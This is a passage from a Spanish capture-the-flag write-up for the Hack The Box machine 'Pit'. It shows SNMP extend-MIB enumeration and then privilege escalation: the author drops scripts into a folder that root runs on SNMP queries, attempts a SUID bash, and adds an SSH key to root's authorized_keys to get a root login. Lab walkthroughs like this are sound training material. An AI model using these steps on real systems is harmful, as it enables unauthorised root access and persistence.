NET-SNMP-EXTEND-MIB::nsExtendArgs."monitoring" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."memory" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."monitoring" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."memory" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."monitoring" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."memory" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendExecType."monitoring" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."memory" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."monitoring" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."memory" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStorage."monitoring" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."memory" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendStatus."monitoring" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."memory" = STRING:               total        used        free      shared  buff/cache   available
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."monitoring" = STRING: Database status
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."memory" = STRING:               total        used        free      shared  buff/cache   available
Mem:        4023500      368524     3326800        8808      328176     3422476
Swap:       1961980           0     1961980
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: Database status
OK - Connection to database successful.
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user

                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

guest_u         user       s0         s0                             guest_r
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
xguest_u        user       s0         s0                             xguest_r
login

Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *
System uptime
 17:10:55 up  2:06,  1 user,  load average: 0.00, 0.02, 0.11
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."memory" = INTEGER: 3
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."monitoring" = INTEGER: 27
NET-SNMP-EXTEND-MIB::nsExtendResult."memory" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendResult."monitoring" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."memory".1 = STRING:               total        used        free      shared  buff/cache   available
NET-SNMP-EXTEND-MIB::nsExtendOutLine."memory".2 = STRING: Mem:        4023500      368524     3326800        8808      328176     3422476
NET-SNMP-EXTEND-MIB::nsExtendOutLine."memory".3 = STRING: Swap:       1961980           0     1961980
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".1 = STRING: Database status
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".2 = STRING: OK - Connection to database successful.
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".3 = STRING: System release info
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".4 = STRING: CentOS Linux release 8.3.2011
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".5 = STRING: SELinux Settings
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".6 = STRING: user
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".7 = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".8 = STRING:                 Labeling   MLS/       MLS/                          
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".9 = STRING: SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".10 = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".11 = STRING: guest_u         user       s0         s0                             guest_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".12 = STRING: root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".13 = STRING: staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".14 = STRING: sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".15 = STRING: system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".16 = STRING: unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".17 = STRING: user_u          user       s0         s0                             user_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".18 = STRING: xguest_u        user       s0         s0                             xguest_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".19 = STRING: login
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".20 = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".21 = STRING: Login Name           SELinux User         MLS/MCS Range        Service
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".22 = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".23 = STRING: __default__          unconfined_u         s0-s0:c0.c1023       *
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".24 = STRING: michelle             user_u               s0                   *
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".25 = STRING: root                 unconfined_u         s0-s0:c0.c1023       *
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".26 = STRING: System uptime
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".27 = STRING:  17:10:55 up  2:06,  1 user,  load average: 0.00, 0.02, 0.11
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".27 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

> Al final del escaneo vemos lo que parece ser la ejecución de un script /usr/bin/monitor. Podemos probar a ejecutar directamente ese MIB y ver si se ejecuta el comando.

```bash
❯ snmpbulkwalk -v2c -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

```ruby
MIB search path: /root/.snmp/mibs:/usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf
Cannot find module (IANA-STORAGE-MEDIA-TYPE-MIB): At line 19 in /usr/share/snmp/mibs/ietf/VM-MIB
Did not find 'IANAStorageMediaType' in module #-1 (/usr/share/snmp/mibs/ietf/VM-MIB)
Cannot find module (IEEE8021-CFM-MIB): At line 30 in /usr/share/snmp/mibs/ietf/TRILL-OAM-MIB
Cannot find module (LLDP-MIB): At line 35 in /usr/share/snmp/mibs/ietf/TRILL-OAM-MIB
Did not find 'dot1agCfmMdIndex' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMaIndex' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMepIdentifier' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMepEntry' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMepDbEntry' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'Dot1agCfmIngressActionFieldValue' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'Dot1agCfmEgressActionFieldValue' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'Dot1agCfmRemoteMepState' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpChassisId' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpChassisIdSubtype' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpPortId' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpPortIdSubtype' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU
Cannot find module (IANA-SMF-MIB): At line 28 in /usr/share/snmp/mibs/ietf/SMF-MIB
Did not find 'IANAsmfOpModeIdTC' in module #-1 (/usr/share/snmp/mibs/ietf/SMF-MIB)
Did not find 'IANAsmfRssaIdTC' in module #-1 (/usr/share/snmp/mibs/ietf/SMF-MIB)
Cannot find module (IANAPowerStateSet-MIB): At line 20 in /usr/share/snmp/mibs/ietf/ENERGY-OBJECT-MIB
Did not find 'PowerStateSet' in module #-1 (/usr/share/snmp/mibs/ietf/ENERGY-OBJECT-MIB)
Cannot find module (IANA-OLSRv2-LINK-METRIC-TYPE-MIB): At line 26 in /usr/share/snmp/mibs/ietf/OLSRv2-MIB
Did not find 'IANAolsrv2LinkMetricTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/OLSRv2-MIB)
Cannot find module (IANA-ENERGY-RELATION-MIB): At line 22 in /usr/share/snmp/mibs/ietf/ENERGY-OBJECT-CONTEXT-MIB
Did not find 'IANAEnergyRelationship' in module #-1 (/usr/share/snmp/mibs/ietf/ENERGY-OBJECT-CONTEXT-MIB)
Cannot find module (IANA-BFD-TC-STD-MIB): At line 30 in /usr/share/snmp/mibs/ietf/BFD-STD-MIB
Did not find 'IANAbfdDiagTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessOperModeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessStateTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessAuthenticationTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessAuthenticationKeyTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 2
NET-SNMP-EXTEND-MIB::nsExtendCommand."memory" = STRING: /usr/bin/free
NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
NET-SNMP-EXTEND-MIB::nsExtendArgs."memory" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendArgs."monitoring" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."memory" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."monitoring" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."memory" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."monitoring" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."memory" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendExecType."monitoring" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."memory" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."monitoring" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."memory" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStorage."monitoring" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."memory" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendStatus."monitoring" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."memory" = STRING:               total        used        free      shared  buff/cache   available
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."monitoring" = STRING: Database status
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."memory" = STRING:               total        used        free      shared  buff/cache   available
Mem:        4023500      368804     3326520        8808      328176     3422196
Swap:       1961980           0     1961980
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: Database status
OK - Connection to database successful.
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user

                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

guest_u         user       s0         s0                             guest_r
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
xguest_u        user       s0         s0                             xguest_r
login

Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *
System uptime
 17:13:02 up  2:08,  1 user,  load average: 0.07, 0.03, 0.09
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."memory" = INTEGER: 3
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."monitoring" = INTEGER: 27
NET-SNMP-EXTEND-MIB::nsExtendResult."memory" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendResult."monitoring" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."memory".1 = STRING:               total        used        free      shared  buff/cache   available
NET-SNMP-EXTEND-MIB::nsExtendOutLine."memory".2 = STRING: Mem:        4023500      368804     3326520        8808      328176     3422196
NET-SNMP-EXTEND-MIB::nsExtendOutLine."memory".3 = STRING: Swap:       1961980           0     1961980
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".1 = STRING: Database status
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".2 = STRING: OK - Connection to database successful.
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".3 = STRING: System release info
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".4 = STRING: CentOS Linux release 8.3.2011
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".5 = STRING: SELinux Settings
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".6 = STRING: user
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".7 = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".8 = STRING:                 Labeling   MLS/       MLS/                          
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".9 = STRING: SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".10 = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".11 = STRING: guest_u         user       s0         s0                             guest_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".12 = STRING: root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".13 = STRING: staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".14 = STRING: sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".15 = STRING: system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".16 = STRING: unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".17 = STRING: user_u          user       s0         s0                             user_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".18 = STRING: xguest_u        user       s0         s0                             xguest_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".19 = STRING: login
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".20 = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".21 = STRING: Login Name           SELinux User         MLS/MCS Range        Service
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".22 = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".23 = STRING: __default__          unconfined_u         s0-s0:c0.c1023       *
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".24 = STRING: michelle             user_u               s0                   *
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".25 = STRING: root                 unconfined_u         s0-s0:c0.c1023       *
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".26 = STRING: System uptime
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".27 = STRING:  17:13:02 up  2:08,  1 user,  load average: 0.07, 0.03, 0.09
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".27 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

> Si estamos atentos podemos ver que el resultado del comando uptime se ha actualizado, además el escaneo tarda un poco más en terminar a la hora de ejecutar el supuesto script.

```bash
[michelle@pit tmp]$ cat /usr/bin/monitor 
```

```ruby
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
```

> Al revisar el contenido del script que se ejecuta a la hora de realizar el escaneo por snmp podemos ver que itera por todos los archivos que contengan la palabra check seguido de cualquier contenido terminado por sh, cada archivo que encuentre lo ejecuta. Si suponemos que esto lo hace el usuario root, podemos intentar una escalada de privilegios.

```bash
[michelle@pit tmp]$ vi /usr/local/monitoring/check_test.sh
```

```ruby
#!/bin/bash

chmod u+s /bin/bash
```

> Una vez creado el archivo volvemos a ejecutar el script mediante el escaneo por SNMP

```bash
❯ snmpbulkwalk -v2c -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

```ruby
.....
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".26 = STRING: chmod: changing permissions of '/bin/bash': Permission denied
.....
```

> Si nos fijamos el usuario no puede establecer los permisos SUID a la /bin/bash, por lo tanto tenemos que intentar otra vía para escalar los privilegios.

```bash
[michelle@pit ~]$ vi /usr/local/monitoring/check_test.sh
```

```ruby
#!/bin/bash
echo "Este comando ha sido ejecutado con el usuario $(whoami)"
```

```bash
❯ snmpbulkwalk -v2c -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

```ruby
.....
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".26 = STRING: Este comando ha sido ejecutado con el usuario root
.....
```

> De esta forma podemos ver que el usuario que ejecuta el script es root.

```bash
❯ ssh-keygen
Generating public/private ed25519 key pair.
Enter file in which to save the key (/root/.ssh/id_ed25519): 
Enter passphrase for "/root/.ssh/id_ed25519" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_ed25519
Your public key has been saved in /root/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:ZedOtLZi1VOk//U1kQo+QnV5KD6oYzsWnkocg+O1Od8 root@pyuser
The key's randomart image is:
+--[ED25519 256]--+
|           . .o .|
|          ...o +.|
|         .=.+ oo.|
|    .   .+.*.o.o.|
|   o +  S. oB.o.+|
|  . + ==  .=.. .*|
|   . *o = o o   o|
|    . o*.. .     |
|     .o..E       |
+----[SHA256]-----+
                                                                                                                                                                                                            
❯ cat /root/.ssh/id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHLy5Lf3MDL8GoeFEKtb1eHuSgAPVUFLij4/OtMiNaD1 root@pyuser
```

> Creamos la claves ssh en nuestro sistema.

```bash
[michelle@pit ~]$ vi /usr/local/monitoring/check_test.sh
```

```ruby
#!/bin/bash

mkdir -p /root/.ssh
chmod 700 /root/.ssh

echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHLy5Lf3MDL8GoeFEKtb1eHuSgAPVUFLij4/OtMiNaD1 root@pyuser" >> /root/.ssh/authorized_keys

chmod 600 /root/.ssh/authorized_keys
```

> Añadimos la clave pública de nuestro sistema al archivo authorized_keys del usuario root.

```bash
❯ snmpbulkwalk -v2c -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

> Ejecutamos el script mediante el escaneo de snmp.

```bash
❯ chmod 600 /root/.ssh/id_ed25519
```

```bash
❯ ssh -i /root/.ssh/id_ed25519 root@10.10.10.241
```

```ruby
Web console: https://pit.htb:9090/ or https://10.10.10.241:9090/

Last login: Thu Nov  3 06:15:20 2022
[root@pit ~]# 
```


![](/img2/Pasted%20image%2020250620233656.png)